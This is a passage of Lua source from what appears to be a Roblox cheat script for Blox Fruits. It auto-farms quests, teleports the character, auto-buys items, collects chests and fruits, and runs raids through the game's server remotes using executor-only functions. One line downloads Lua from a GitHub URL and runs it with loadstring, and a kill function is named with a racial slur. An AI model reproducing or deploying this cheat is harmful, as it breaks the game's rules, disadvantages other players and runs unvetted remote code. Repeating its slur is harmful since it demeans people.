        LevelMaxReq = 699
    elseif game.PlaceId ==4442272183 then 
        LevelMaxReq = 1475
    end
    for i, v in pairs(Quest) do
        for i1, v1 in pairs(v) do
            local lvlreq = v1.LevelReq
            for i2, v2 in pairs(v1.Task) do
                if
                    lvlPl >= lvlreq and lvlreq >= Returner["LevelReq"] and lvlreq <= LevelMaxReq and v1.Task[i2] > 1 and
                        not table.find(UselessQuest, tostring(i))
                then
                    Returner["LevelReq"] = lvlreq 
                    Returner["Mob"] = tostring(i2) 
                    Returner["QuestName"] = i 
                    Returner["QuestId"] = i1
                end
            end
        end
    end
    if DoubleQuest and IsHavingQuest() then 
        local CurrentMob = Returner["Mob"]
        if
        lvlPl >= 10 and IsHavingQuest() and
            CheckCurrentQuestMob() == Returner["Mob"]
        then
            for i, v in pairs(Quest) do
                for i1, v1 in pairs(v) do
                    for i2, v2 in pairs(v1.Task) do
                        if tostring(i2) == tostring(CurrentMob) then
                            for quest1, quest2 in next, v do
                                for quest3, quest4 in next, quest2.Task do
                                    if tostring(quest3) ~= tostring(CurrentMob) and quest4 > 1 then
                                        if quest2.LevelReq <= lvlPl then
                                            Returner["Mob"]  = tostring(quest3)
                                            Returner["QuestName"]  = i
                                            Returner["QuestId"] = quest1 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    Returner["QuestCFrame"] = CFrameByLevelQuest[Returner["LevelReq"]]
    return Returner
end
local function TweenKillInstant(POS) 
    local tweenfunc = {}
    local tween_s = game:service "TweenService"
    local info =
        TweenInfo.new(
        GetDistance(POS) /
            300,
        Enum.EasingStyle.Linear
    )
    if GetDistance(POS) < 200 then 
        if getgenv().tween then 
            getgenv().tween:Cancel()
            getgenv().tween = nil 
        end
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = POS 
    else 
        getgenv().tween =
            tween_s:Create(
            game:GetService("Players").LocalPlayer.Character["HumanoidRootPart"],
            info,
            {CFrame = POS}
        )
        getgenv().tween:Play() 
    end
end
function GetQuest(QuestTables) 
    if game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then
        return
    end 
    SetContent('Getting quest...')
    if not QuestTables or not QuestTables["Mob"] or not QuestTables["QuestName"] or not QuestTables["LevelReq"] or not QuestTables["QuestId"] or not QuestTables["QuestCFrame"] then 
        QuestTables = CheckQuestByLevel()
    end
    if QuestTables.QuestCFrame and GetDistance(QuestTables.QuestCFrame) <= 8 then  
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest", tostring(QuestTables["QuestName"]), QuestTables["QuestId"])
        task.wait(1.5)
    else
        if GetDistance(QuestTables["QuestCFrame"] * CFrame.new(0,0,-2)) < 1000 then 
            TweenKillInstant(QuestTables["QuestCFrame"] * CFrame.new(0,0,-2))
        else 
            Tweento(QuestTables["QuestCFrame"] * CFrame.new(0,0,-2))
        end
        task.wait(.5) 
        GetQuest(QuestTables)
    end
end    
local AllNPCS = getnilinstances()
for i, v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
    table.insert(AllNPCS, v)
end
function GetNPC(npc)
    for i, v in pairs(AllNPCS) do
        if v.Name == npc then
            return v
        end
    end
end  
local function FireAddPoint(PointName,num) 
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AddPoint",PointName,num)
end
function autoStats() 
    if IsPlayerAlive() then
        local MaxLevel = 2550 
        local Stats_Melee = game:GetService("Players").LocalPlayer.Data.Stats.Melee.Level.Value  
        local Stats_Def = game:GetService("Players").LocalPlayer.Data.Stats['Defense'].Level.Value
        local Stats_DF = game:GetService("Players").LocalPlayer.Data.Stats["Demon Fruit"].Level.Value 
        local Stats_Gun = game:GetService("Players").LocalPlayer.Data.Stats.Gun.Level.Value 
        local Stats_Sword = game:GetService("Players").LocalPlayer.Data.Stats.Sword.Level.Value   
        if Stats_Melee < MaxLevel then 
            FireAddPoint('Melee',MaxLevel-Stats_Melee)
        elseif Stats_Def < 2550 then 
            FireAddPoint('Defense',MaxLevel-Stats_Def)
            --[[
                    elseif Stats_DF < 1750 then 
            FireAddPoint('Demon Fruit',1750-Stats_DF)]]
        else 
            FireAddPoint('Sword',MaxLevel-Stats_Sword)
        end
    end
end
function PushData(tab,newdata)
    for i = 1, #tab - 1 do
        tab[i] = tab[i + 1]  -- Gán giá trị ở vị trí i + 1 vào vị trí i
    end

    tab[#tab] = newdata -- Xóa phần tử cuối cùng (hoặc gán giá trị mới nếu cần)
    return tab
end
function FarmMobByLevel(level)
    if not level then  
        level = game.Players.LocalPlayer.Data.Level.Value 
        if Sea1 and level >= 700 then  
            level = 650 
            if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") == 0 then 
                TeleportWorld(2)
            end
        elseif Sea2 and level >= 1500 then  
            level = 1450
            if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ZQuestProgress", "Zou") == 0 then 
                TeleportWorld(3)
            end
             
        end
    end
    local CurrentQuestMob = CheckCurrentQuestMob()
    if level <= game.Players.LocalPlayer.Data.Level.Value and not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then 
        local NewQuest = CheckQuestByLevel({
            Level = level,
            DoubleQuest = Config.DoubleQuest
        }) 
        GetQuest(NewQuest)
    elseif CheckMob(CurrentQuestMob) then 
        KillNigga(CheckMob(CurrentQuestMob))
    elseif getgenv().MobSpawnClone and getgenv().MobSpawnClone[CurrentQuestMob] then 
        SetContent('Waitting for mob spawn '..tostring(CurrentQuestMob))
        Tweento(getgenv().MobSpawnClone[CurrentQuestMob] * CFrame.new(0,60,0))
        for i,v in pairs(game.workspace.MobSpawns:GetChildren()) do 
            if v.Name == CurrentQuestMob and GetDistance(v,getgenv().MobSpawnClone[CurrentQuestMob]) > 300 and not CheckMob(CurrentQuestMob) then  
                Tweento(v.CFrame* CFrame.new(0,30,0))
            end
        end
    end
end
FruitsID = loadstring(game:HttpGet("https://raw.githubusercontent.com/memaybeohub/Function-Scripts/main/Magnetism.lua"))()
function ReturnFruitNameWithId(v) 
    if not v then return end 
    local SH = v:WaitForChild("Fruit",15):WaitForChild("Fruit",1)
    if not SH then 
        SH = v:WaitForChild("Fruit",15):WaitForChild("Retopo_Cube.001",1) 
    end
    for i,v in pairs(FruitsID) do 
        if v == SH.MeshId then 
            return i 
        end
    end   
    return v.Name
end
local function mmb(v)  
    local OC = tostring(v):split('-')
    if #OC >= 3 then 
        local OC2 = {} 
        for i,v in pairs(OC) do 
            table.insert(OC2,v)
            if #OC2 >= #OC/2 then break end 
        end
        return unpack(OC2)
    else
        return OC[1]
    end
end
function ReturnToShowFruit(v)
    local OC = ReturnFruitNameWithId(v):split('-')
    if #OC >= 3 then 
        local OC2 = {} 
        for i,v in pairs(OC) do 
            table.insert(OC2,v)
            if #OC2 >= #OC/2 then break end 
        end
        return unpack(OC2)
    else
        return OC[1]
    end
end
function CheckNatural(v)
    return not v:GetAttribute("OriginalName")
end
function getPriceFruit(z5)
    for i,v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
        "GetFruits",
        game:GetService("Players").LocalPlayer.PlayerGui.Main.FruitShop:GetAttribute("Shop2")
    )) do 
        if v.Name == z5 then 
            return v.Price 
        end
    end
    return 0 
end
function getRealFruit(v)
    local kf = CheckNatural(v) and " (Spawned)" or ""
    return ReturnFruitNameWithId(v) .. " ("..tostring(getPriceFruit(ReturnFruitNameWithId(v))).."$) ".. tostring(kf)
end 
function SendKey(key, holdtime,mmb)
    if key and (not mmb or (mmb)) then
        if not holdtime then
            game:service("VirtualInputManager"):SendKeyEvent(true, key, false, game)
            task.wait()
            game:service("VirtualInputManager"):SendKeyEvent(false, key, false, game)
        elseif holdtime then
            game:service("VirtualInputManager"):SendKeyEvent(true, key, false, game)
            task.wait(holdtime)
            game:service("VirtualInputManager"):SendKeyEvent(false, key, false, game)
        end
    end
end
function collectAllFruit_Store()
    if getgenv().ServerData['Workspace Fruits'] then 
        for i,v in pairs(getgenv().ServerData['Workspace Fruits']) do 
            SetContent('Tween  '..getRealFruit(v))
            Tweento(v.Handle.CFrame)
            task.wait(.1) 
            task.delay(3,function()
                if getgenv().CurrentTask == 'Collect Fruit' then 
                    getgenv().CurrentTask = ''
                end
            end)
        end
    end
end 
getgenv().CurrentElite = false
function LoadBoss(v)  
    local CastleCFrame = CFrame.new(-5543.5327148438, 313.80062866211, -2964.2585449219)
    local Root = v.PrimaryPart or v:WaitForChild('HumanoidRootPart',3)
    local Hum = v:WaitForChild('Humanoid',3)
    task.spawn(function()
        AddNoknockback(v)
        if Sea3 and Hum and Root and v:FindFirstChildOfClass('Humanoid') and v:FindFirstChildOfClass('Humanoid').Health > 0 and GetDistance(v.PrimaryPart,CastleCFrame) <= 1500 then  
            getgenv().PirateRaidTick = tick() 
        end
    end)
    local IsElite = table.find(Elites,RemoveLevelTitle(v.Name))
    if Hum and Root and v:FindFirstChildOfClass('Humanoid') and v.Humanoid.Health > 0 and (v.Humanoid.DisplayName:find('Boss') or RemoveLevelTitle(v.Name) == 'Core' or IsElite) and not getgenv().ServerData['Server Bosses'][v.Name] then 
        if not IsElite then 
            getgenv().ServerData['Server Bosses'][v.Name] = v  
        end
    else
        return
    end 
    if RemoveLevelTitle(v.Name) == 'rip_indra True Form' then 
        repeat task.wait() until getgenv().ServerData['PlayerData'] and getgenv().ServerData['PlayerData'].Level
        if getgenv().ServerData['PlayerData'].Level >= 2000 and not getgenv().ServerData["Inventory Items"]["Tushita"] then 
            getgenv().CurrentTask = 'Auto Item : Tushita'
        end
    end
    if table.find(Elites,RemoveLevelTitle(v.Name)) then 
        getgenv().CurrentElite = v 
    end 
    v.Humanoid:GetPropertyChangedSignal('Health'):Connect(function()
        if v.Humanoid.Health <= 0 then  
            if table.find(Elites,RemoveLevelTitle(v.Name)) then 
                getgenv().CurrentElite = nil
            end
            local index = getgenv().ServerData['Server Bosses'][v.Name]
            if index then
                getgenv().ServerData['Server Bosses'][v.Name] = nil
            end            
            return
        end
    end)
end  
function TeleportWorld(world)
    if typeof(world) == "string" then
        world = world:gsub(" ", ""):gsub("Sea", "")
        world = tonumber(world)
    end
    if world == 1 then
        local args = {
            [1] = "TravelMain"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    elseif world == 2 then
        local args = {
            [1] = "TravelDressrosa"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    elseif world == 3 then
        local args = {
            [1] = "TravelZou"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
end
getgenv().ServerData["Inventory Items"] = {}
getgenv().ServerData['Skill Loaded'] = {}
getgenv().ServerData['Workspace Fruits'] = {}
getgenv().ServerData['Server Bosses'] = {}
getgenv().ServerData["PlayerBackpack"] = {}
for i,v in pairs(game.workspace.Enemies:GetChildren()) do 
    LoadBoss(v) 
end
for i,v in pairs(game.ReplicatedStorage:GetChildren()) do 
    if v:FindFirstChild('Humanoid') then 
        task.spawn(function()
            LoadBoss(v)
        end)
    end
end 
function CheckRaceVer()
    local v113 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
    local v111 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
    if game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") then
        return "V4"
    end
    if v113 == -2 then
        return "V3"
    end
    if v111 == -2 then
        return "V2"
    end
    return "V1"
end 
workspace.Enemies.ChildAdded:Connect(LoadBoss)
game.ReplicatedStorage.ChildAdded:Connect(LoadBoss) 

local Melee_and_Price = {
    ["Black Leg"] = {Beli = 150000, Fragment = 0},
    ["Fishman Karate"] = {Beli = 750000, Fragment = 0},
    ["Electro"] = {Beli = 500000, Fragment = 0},
    ["Dragon Claw"] = {Beli = 0, Fragment = 1500},
    ["Superhuman"] = {Beli = 3000000, Fragment = 0},
    ["Sharkman Karate"] = {Beli = 2500000, Fragment = 5000},
    ["Death Step"] = {Beli = 2500000, Fragment = 5000},
    ["Dragon Talon"] = {Beli = 3000000, Fragment = 5000},
    ["Godhuman"] = {Beli = 5000000, Fragment = 5000},
    ["Electric Claw"] = {Beli = 3000000, Fragment = 5000},
    ["Sanguine Art"] = {Beli = 5000000, Fragment = 5000},
}
local Melee_and_RemoteBuy = {
    ["Black Leg"] = "BuyBlackLeg",
    ["Fishman Karate"] = "BuyFishmanKarate",
    ["Electro"] = "BuyElectro",
    ["Dragon Claw"] = function()
        local OwnDragonClaw = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1") == 1
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
        return OwnDragonClaw
    end,
    ["Superhuman"] = "BuySuperhuman",
    ["Sharkman Karate"] = "BuySharkmanKarate",
    ["Death Step"] = "BuyDeathStep",
    ["Dragon Talon"] = "BuyDragonTalon",
    ["Godhuman"] = "BuyGodhuman",
    ["Electric Claw"] = "BuyElectricClaw",
    ["Sanguine Art"] = "BuySanguineArt"
} 
local Melee_in_game = {}
for i,v in pairs(Melee_and_RemoteBuy) do 
    table.insert(Melee_in_game,i)
end
table.sort(Melee_in_game)
function BuyMelee(MeleeN)
    if IsPlayerAlive() and not KillingMob then 
        if getgenv().ServerData["PlayerBackpack"][MeleeN] then 
            task.spawn(function()
                getgenv().Config["Melee Level Values"][MeleeN] = getgenv().ServerData["PlayerBackpack"][MeleeN].Level.Value 
            end) 
            return
        end
        local RemoteArg = Melee_and_RemoteBuy[MeleeN]
        if type(RemoteArg) == "string" then
            local Loser = game.ReplicatedStorage.Remotes.CommF_:InvokeServer(RemoteArg, true) 
            local BeliPassed = getgenv().ServerData['PlayerData'].Beli >= Melee_and_Price[MeleeN].Beli 
            local FragmentPassed = getgenv().ServerData['PlayerData'].Fragments >= Melee_and_Price[MeleeN].Fragment   
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer(RemoteArg) 
            --if Loser then
                --[[

                and (Loser ~= 3 and (Loser ~= 0 or (Loser == 0 and FragmentPassed and BeliPassed ))) 
and (MeleeN == 'Godhuman' or (MeleeN == 'Godhuman' and CheckMaterialCount('Fish Tail') >= 20 and CheckMaterialCount('Magma Ore') >= 20 and CheckMaterialCount('Mystic Droplet') >= 10 and  CheckMaterialCount('Dragon Scale') >= 10)) then  
                ]]

            --end
        else
            pcall(
                function()
                    game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
                    RemoteArg()
                end
            )
        end 
    end
end
function getMeleeLevelValues()
    SetContent('Checking all melee')
    task.spawn(function()
        if not getgenv().Config then repeat task.wait() until getgenv().Config end
        if not getgenv().Config["Melee Level Values"] then getgenv().Config["Melee Level Values"] = {} end
        for i,v in pairs(Melee_and_RemoteBuy) do 
            if not getgenv().Config["Melee Level Values"][i] then 
                getgenv().Config["Melee Level Values"][i] = 0 
            end
            if getgenv().Config["Melee Level Values"][i] == 0 then 
                BuyMelee(i)
            end
            if getgenv().ServerData["PlayerBackpack"][i] then 
                getgenv().Config["Melee Level Values"][i] = getgenv().ServerData["PlayerBackpack"][i].Level.Value 
            end 
        end
    end) 
end 
function getFruitBelow1M()
    local minValue = 1000000
    local fruitName 
    for i,v in pairs(getgenv().ServerData["Inventory Items"]) do 
        if v.Value and v.Value < minValue then 
            fruitName = v.Name 
            minValue = v.Value  
        end 
    end
    return fruitName 
end
getMeleeLevelValues() 
getgenv().CheckAllMelee = true
function ReloadFrutis()    
    SetContent('Checking Fruits in Server')
    for i,v in pairs(game.workspace:GetChildren()) do 
        if v.Name:find('Fruit') and not table.find(getgenv().ServerData['Workspace Fruits'],v) then 
            pcall(function()
                local vN = ReturnFruitNameWithId(v)
                table.insert(getgenv().ServerData['Workspace Fruits'],v)  
                local selfs 
                selfs = v:GetPropertyChangedSignal('Parent'):Connect(function()
                    if v.Parent ~= game.workspace then 
                        getgenv().ServerData['Workspace Fruits'] = {}
                        selfs:Disconnect()
                        ReloadFrutis()
                    end
                end)
            end)
        end 
    end
end  
function CheckAnyPlayersInCFrame(CFrameCheck, MinDistance)
    local CurrentFound
    for i, v in pairs(game.Players:GetChildren()) do
        pcall(
            function()
                if
                    v.Name ~= game.Players.LocalPlayer.Name and
                        GetDistance(v.Character.HumanoidRootPart, CFrameCheck) < MinDistance
                 then
                    CurrentFound = GetDistance(v.Character.HumanoidRootPart, gggggggggggggg)
                end
            end
        )
    end
    return CurrentFound
end 
ReloadFrutis() 
game:GetService("Workspace")["_WorldOrigin"].Locations.ChildAdded:Connect(function(v)
    local AddedTick = tick() 
    if not getgenv().ServerData then getgenv().ServerData = {} end
    if v.Name == 'Island 1' then 
        repeat 
            task.wait()
        until tick()-AddedTick > 60 or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.Position).Magnitude <= 1000 
        if tick()-AddedTick > 60 then 
            return  
        end
    end 
    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.Position).Magnitude <= 4500 then  
        if v.Name:find('Island') then 
            v:GetPropertyChangedSignal('Parent'):Connect(function()
                if not v.Parent or v.Parent ~= game:GetService("Workspace")["_WorldOrigin"].Locations then  
                    if getgenv().CurrentTask == 'Auto Raid' and getgenv().ServerData['Nearest Raid Island'] then 
                        repeat task.wait(1) until not game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible
                        getgenv().CurrentTask = '' 
                        warn('Clearing',getgenv().ServerData['Nearest Raid Island']) 
                        if not getgenv().ServerData['Nearest Raid Island'] then 
                            getgenv().CurrentTask = ''
                        end
                        getgenv().NextRaidIslandId = 1 
                        getgenv().ServerData['Nearest Raid Island'] = nil
                        getgenv().tween:Cancel()   
                        if getgenv().KillAuraConnection then 
                            getgenv().KillAuraConnection:Disconnect()
                            getgenv().KillAuraConnection = nil 
                        end
                    end
                end
            end)  
        end 
        getgenv().ServerData['Nearest Raid Island'] = getNearestRaidIsland()
    end
end)  
function CheckX2Exp()
    local a2, b2 =
        pcall(
        function()
            if getgenv().ServerData['PlayerData'].Level < 2450 then
                if string.find(game.Players.LocalPlayer.PlayerGui.Main.Level.Exp.Text, "ends in") then
                    return true
                end
            end
        end
    )
    if a2 then
        return b2
    end
end 
function PickChest(Chest)
    if not getgenv().ChestCollect or typeof(getgenv().ChestCollect) ~= 'number' then 
        getgenv().ChestCollect = 0 
    end
    if not Chest then 
        return 
    elseif not getgenv().ChestConnection then 
        SetContent('Picking up chest | '..tostring(getgenv().ChestCollect))
        getgenv().ChestConnection = Chest:GetPropertyChangedSignal('Parent'):Connect(function()
            getgenv().ChestCollect = getgenv().ChestCollect + 1
            getgenv().ChestConnection:Disconnect()
            getgenv().ChestConnection = nil
            SortChest()
        end) 
        local StartPick = tick()
        local TouchTrans 
        local OldChestCollect = getgenv().ChestCollect
        repeat 
            Tweento(Chest.CFrame)
            TouchTrans= Chest:FindFirstChildOfClass('TouchTransmitter')
            if GetDistance(Chest) <= 10 and TouchTrans then
                task.spawn(function()
                    SendKey('Space',.4)
                end)
                --firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, TouchTrans, 0)
                --firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, TouchTrans, 1)
            end
        until not Chest or not Chest.Parent or tick()-StartPick >= 60 
        if Chest and Chest.Parent then 
            Chest:Destroy() 
        elseif getgenv().ChestCollect == OldChestCollect then 
            getgenv().ChestCollect = getgenv().ChestCollect + 1
        end
    end
end
local Raids = require(game:GetService("ReplicatedStorage").Raids).raids
local AdvancedRaids = require(game:GetService("ReplicatedStorage").Raids).advancedRaids
local RealRaid = {}
for i, v in pairs(Raids) do 
    if v ~= " " and v ~= "" then 
        table.insert(RealRaid, v) 
    end
end
for i, v in pairs(AdvancedRaids) do
    if v ~= " " and v ~= "" then 
        table.insert(RealRaid, v) 
    end
end 
function CheckMaterialCount(MM) 
    local Count = 0 
    if getgenv().ServerData['Inventory Items'][MM] and getgenv().ServerData['Inventory Items'][MM].Count then 
        Count = getgenv().ServerData['Inventory Items'][MM].Count 
    end 
    return Count
end
getgenv().SuccessBoughtTick = 0
getgenv().LastBuyChipTick = 0
function buyRaidingChip() 
    if getgenv().EnLoaded and (Sea2 or Sea3) and tick()-JoinedGame > 60 and tick()-getgenv().SuccessBoughtTick > 60 and getgenv().ServerData['PlayerData'].Level >= 1100 and not getgenv().ServerData["PlayerBackpack"]['Special Microchip'] and not CheckIsRaiding() then 
        if (((getgenv().CurrentTask == '' or getgenv().MeleeTask == 'None') and getgenv().CurrentTask ~= 'Auto Sea 3') or getgenv().FragmentNeeded) and not checkFruit1M() and (getgenv().FragmentNeeded or (not CheckX2Exp() and ((getgenv().ServerData['PlayerData'].Fragments < 7500 or (getgenv().ServerData['PlayerData'].Level >= 2550 and getgenv().ServerData['PlayerData'].Fragments < 25000)) or #getgenv().ServerData["PlayerBackpackFruits"] > 0))) then 
            wait(1)
            local SelRaid = "Flame"
            if table.find(Raids,mmb(getgenv().ServerData['PlayerData'].DevilFruit)) then  
                SelRaid = mmb(getgenv().ServerData['PlayerData'].DevilFruit)
            end
            local bought = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc","Select",SelRaid) == 1 
            if bought then 
                getgenv().SuccessBoughtTick = tick() 
            else
                local below1MFruit = getFruitBelow1M()
                if below1MFruit then 
                    SetContent('Getting '..tostring(below1MFruit)..' from inventory to buy chips...')
                    if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("LoadFruit", below1MFruit) then 
                        buyRaidingChip() 
                    else 
                        getgenv().ServerData['Inventory Items'] = {}
                    end
                end
            end 
        end
    end 
    getgenv().LastBuyChipTick = tick()
end 
getgenv().ServerData['Chest'] = {}
getgenv().ChestsConnection = {}
function SortChest()
    local LOROOT = game.Players.LocalPlayer.Character.PrimaryPart or game.Players.LocalPlayer.Character:WaitForChild('HumanoidRootPart')
    if LOROOT then
        table.sort(getgenv().ServerData['Chest'], function(chestA, chestB)  
            local distanceA
            local distanceB
            if chestA:IsA('Model') then 
                distanceA = (Vector3.new(chestA:GetModelCFrame()) - LOROOT.Position).Magnitude
            end 
            if chestB:IsA('Model') then 
                distanceB = (Vector3.new(chestB:GetModelCFrame()) - LOROOT.Position).Magnitude 
            end
            if not distanceA then  distanceA = (chestA.Position - LOROOT.Position).Magnitude end
            if not distanceB then  distanceB = (chestB.Position - LOROOT.Position).Magnitude end
            return distanceA < distanceB -- Sắp xếp giảm dần
        end)
    end
end
function AddChest(chest)
    wait()
    if table.find(getgenv().ServerData['Chest'], chest) or not chest.Parent then return end 
    if not string.find(chest.Name,'Chest') then return end
    local CallSuccess,Returned = pcall(function()
        return GetDistance(chest)
    end)
    if not CallSuccess or not Returned then return end
    table.insert(getgenv().ServerData['Chest'], chest)  
    local parentChangedConnection
    parentChangedConnection = chest:GetPropertyChangedSignal('Parent'):Connect(function()
        local index = table.find(getgenv().ServerData['Chest'], chest)
        table.remove(getgenv().ServerData['Chest'], index)
        parentChangedConnection:Disconnect()
        SortChest()
    end)
end

function LoadChest()
    for _, v in pairs(workspace:GetDescendants()) do
        if string.find(v.Name, 'Chest') then
            task.spawn(function()
                AddChest(v)
                local parentFullName = tostring(v.Parent:GetFullName())
                if not getgenv().ChestsConnection[parentFullName] then
                    getgenv().ChestsConnection[parentFullName] = v.Parent.ChildAdded:Connect(AddChest)
                end
            end)
        end
    end 
    warn('Loaded total',#getgenv().ServerData['Chest'],'chests') 
    SortChest()
end

LoadChest() 
function getNearestChest()
    for i,v in pairs(getgenv().ServerData['Chest']) do
        return v 
    end
end 
function advancedSkills(v2) 
    if v2:IsA("Frame") then 
        if v2.Name ~= 'Template' then 
            v2.Cooldown:GetPropertyChangedSignal('Size'):Connect(function()
                if v2.Name ~= "Template" and v2.Title.TextColor3 == Color3.new(1, 1, 1) and (v2.Cooldown.Size == UDim2.new(0, 0, 1, -1) or v2.Cooldown.Size == UDim2.new(1, 0, 1, -1))then
                    getgenv().ServerData['Skill Loaded'][v2.Parent.Name][v2.Name] = true  
                elseif v2.Name ~= 'Template' then 
                    getgenv().ServerData['Skill Loaded'][v2.Parent.Name][v2.Name] = false  
                end 
            end) 
        end
        if v2.Name ~= "Template" and v2.Title.TextColor3 == Color3.new(1, 1, 1) and (v2.Cooldown.Size == UDim2.new(0, 0, 1, -1) or v2.Cooldown.Size == UDim2.new(1, 0, 1, -1))
         then
            getgenv().ServerData['Skill Loaded'][v2.Parent.Name][v2.Name] = true 
        end 
    end
end
function addSkills(v) 
    if not table.find({'Title','Container','Level','StarContainer','Rage'},v.Name) then 
        if not getgenv().ServerData['Skill Loaded'][v.Name] then 
            getgenv().ServerData['Skill Loaded'][v.Name] = {}
        end 
        v.ChildAdded:Connect(advancedSkills)
    end
end
function loadSkills()
    for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills:GetChildren()) do 
        addSkills(v)
    end
    game:GetService("Players").LocalPlayer.PlayerGui.Main.Skills.ChildAdded:Connect(addSkills) 
end    
function CheckTorchDimension(DimensionName) 
    DimensionName = DimensionName == "Yama" and "HellDimension" or "HeavenlyDimension" 
    if game.workspace.Map:FindFirstChild(DimensionName) then 
        v3 = game.workspace.Map:FindFirstChild(DimensionName):GetChildren()
        for i, v in pairs(v3) do
            if string.find(v.Name, "Torch") then
                if v.ProximityPrompt.Enabled == true then
                    return v
                end
            end
        end
    end
end  
function CheckQuestCDK() 
    if not Sea3 then return end
    local CDK_LevelQuest = {
        Good = 666,
        Evil = 666
    }
    Check,CheckValue = pcall(function()
        for i,v in pairs(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Good")) do 
            CDK_LevelQuest[i] = v 
        end
    end)
    if CDK_LevelQuest.Good == -2 or CDK_LevelQuest.Good == 4 then 
        getgenv().CDK_Yama = true 
    end   
    task.spawn(function()
        if CDK_LevelQuest.Good ~= -2 and CDK_LevelQuest.Evil ~= -2 then 
            if not getgenv().CDK_Yama then 
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Good")
            else
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Evil")
            end
        end
    end) 
    if game.Players.LocalPlayer.PlayerGui.Main.Dialogue.Visible then
        game:GetService("VirtualUser"):Button1Down(Vector2.new(0, 0))
        game:GetService("VirtualUser"):Button1Down(Vector2.new(0, 0))
    end
    if CDK_LevelQuest.Good == 4 and CDK_LevelQuest.Evil == 3 then
        return "Pedestal2"
    elseif CDK_LevelQuest.Good == 3 and CDK_LevelQuest.Evil == 4 then
        return "Pedestal1"
    end
    if CDK_LevelQuest.Evil == 4 and CDK_LevelQuest.Good == 4 then
        return "The Final Boss"
    end  
    if CDK_LevelQuest.Good ~= -2 then 
        if GetDistance(game:GetService("Workspace")["_WorldOrigin"].Locations["Heavenly Dimension"]) < 2000 then 
            return "Tushita Dimension"
        end
        if CDK_LevelQuest.Good == -3 or CDK_LevelQuest.Good == -4 then 
            return "Tushita Quest "..tostring(CDK_LevelQuest.Good)
        end 
        if CDK_LevelQuest.Good == -5 then 
            return "Cake Queen"
        end
    else 
        if GetDistance(game:GetService("Workspace")["_WorldOrigin"].Locations["Hell Dimension"]) <= 2000 then 
            return "Yama Dimension"
        end
        if CDK_LevelQuest.Evil == -3 or CDK_LevelQuest.Evil == -4 then 
            return "Yama Quest "..tostring(CDK_LevelQuest.Evil)
        end  
        local v316, v317, v318, v319 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Check")
        if ((v318 and v318 > 0)) then 
            return "Soul Reaper"
        end
    end
end  
function CheckHazeMob()
    for i, v in pairs(game.workspace.Enemies:GetChildren()) do
        if
            RemoveLevelTitle(v.Name) == NearestHazeMob() and v:IsA("Model") and
                v:FindFirstChild("HumanoidRootPart") and
                v:FindFirstChild("Humanoid") and
                v.Humanoid.Health > 0
         then
            return v
        end
    end
end 
function CheckMobHaki(mb)
    if mb:FindFirstChild("Humanoid") then
        for i, v in pairs(mb:WaitForChild("Humanoid"):GetChildren()) do
            if string.find(v.Name, "Buso") then
                return v
            end
        end
    end
end
function FindMobHasHaki(IncludedStorage)
    for i, v in pairs(game.workspace.Enemies:GetChildren()) do
        if v:FindFirstChildOfClass('Humanoid') and v:FindFirstChildOfClass('Humanoid').Health > 0 and CheckMobHaki(v) then
            return v
        end
    end
    if IncludedStorage then
        if v:FindFirstChildOfClass('Humanoid') and v:FindFirstChildOfClass('Humanoid').Health > 0 and CheckMobHaki(v) then
            if CheckMobHaki(v) then
                return v
            end
        end
    end
end
function NearestHazeMob()
    local AllHazeMobs = {}
    if not game:GetService("Players").LocalPlayer:FindFirstChild('QuestHaze') then 
        return ""
    end
    for i, v in pairs(game:GetService("Players").LocalPlayer.QuestHaze:GetChildren()) do
        if v.Value > 0 then
            table.insert(AllHazeMobs, RemoveLevelTitle(v.Name))
        end
    end
    local MobF = ""
    local maxDis = math.huge
    for i, v in pairs(AllHazeMobs) do
        if MobSpawnClone[v] then
            if GetDistance(MobSpawnClone[v]) < maxDis then
                maxDis = GetDistance(MobSpawnClone[v]) 
                MobF = v 
            end
        end
    end
    return MobF
end
if not getgenv().ServerData['PlayerData'] then getgenv().ServerData['PlayerData'] = {} end

getgenv().ServerData['PlayerData']['Colors'] = {} 
function UnCompleteColor()
    for i, v in next, game:GetService("Workspace").Map["Boat Castle"].Summoner.Circle:GetChildren() do
        if v:IsA("Part") and v:FindFirstChild("Part") and v.Part.BrickColor.Name == "Dark stone grey" then
            return v
        end
    end
end    
function HasColor(BrickColorName) 
    local BricksWithColors = {
        ["Hot pink"] = "Winter Sky",
        ["Really red"] = "Pure Red",
        ["Oyster"] = "Snow White"
    }
